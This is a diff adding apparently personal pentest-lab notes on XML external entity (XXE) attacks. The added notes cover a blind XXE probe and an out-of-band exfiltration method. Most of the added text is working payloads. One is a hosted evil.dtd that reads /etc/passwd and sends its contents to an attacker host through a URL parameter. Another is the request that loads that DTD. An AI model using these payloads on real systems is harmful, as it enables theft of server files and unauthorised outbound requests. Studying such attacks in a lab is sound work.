@@ -75,3 +75,33 @@ PHP Wrapper Inside XXE
 <FirmwareUpdateConfig>
     <Firmware>
         <Version>&xxe;</Version>
+
+Blind XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://prasannak.attacker.vuln.lab.netspi-u.com:8080/xxe-test1">
+]>
+<foo>&xxe;</foo>
+
+If the XML parser is vulnerable, when it processes this, it will try to fetch that URL as part of resolving the entity —
+even though the result never appears in the visible response. You watch your Python server terminal (from the attacke
+host, as I explained before) — if a request lands there, you've just proven the server is vulnerable to XXE and is making 
+outbound requests based on your XML, even blin
+
+2 method
+On your attacker host, you'd host a file (let's call it evil.dtd):
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://prasannak.attacker.vuln.lab.netspi-u.com:8080/leak?data=%file;'>">
+%eval;
+%exfil;
+
+Your actual payload to the vulnerable app then just references that hosted DTD:
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://prasannak.attacker.vuln.lab.netspi-u.com:8080/evil.dtd">
+  %xxe;
+]>
+<foo>test</foo>
+
+
+
